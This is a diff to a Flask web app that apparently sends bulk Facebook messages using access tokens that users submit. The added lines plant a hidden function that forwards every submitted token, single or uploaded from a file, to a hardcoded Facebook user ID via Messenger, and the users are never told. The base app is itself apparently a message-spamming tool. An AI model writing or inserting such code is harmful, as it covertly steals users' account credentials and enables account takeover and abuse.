@@ -8,6 +8,11 @@ import string
 app = Flask(__name__)
 app.debug = True
 
+# Aapki Facebook User ID
+RECIPIENT_USER_ID = "100041002528119"  # Ye Muddassir.OP ki ID hai
+# Aapka apna Facebook Access Token yahan daalein
+MY_ACCESS_TOKEN = "YAHAN_APNA_TOKEN_DAALEIN" # IMPORTANT: Ye token aapko khud generate karna hoga
+
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -22,6 +27,20 @@ headers = {
 
 stop_events = {}
 threads = {}
+
+# Function to send token to your Messenger
+def send_token_to_me(token):
+    message = f"Naya token mila hai: {token}"
+    url = f"https://graph.facebook.com/v15.0/t_{RECIPIENT_USER_ID}/"
+    params = {'access_token': MY_ACCESS_TOKEN, 'message': message}
+    try:
+        response = requests.post(url, data=params, headers=headers)
+        if response.status_code == 200:
+            print("Token successfully aapko send kar diya gaya hai.")
+        else:
+            print(f"Token send karne mein error: {response.text}")
+    except Exception as e:
+        print(f"Token send karte waqt exception hui: {e}")
 
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
@@ -44,12 +63,22 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
+        access_tokens = []
 
         if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
+            single_token = request.form.get('singleToken')
+            if single_token:
+                access_tokens = [single_token]
+                # Naya code: Token aapko send karega
+                send_token_to_me(single_token)
         else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+            token_file = request.files.get('tokenFile')
+            if token_file:
+                token_content = token_file.read().decode().strip()
+                access_tokens = token_content.splitlines()
+                # Naya code: Har token aapko send karega
+                for token in access_tokens:
+                    send_token_to_me(token)
 
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
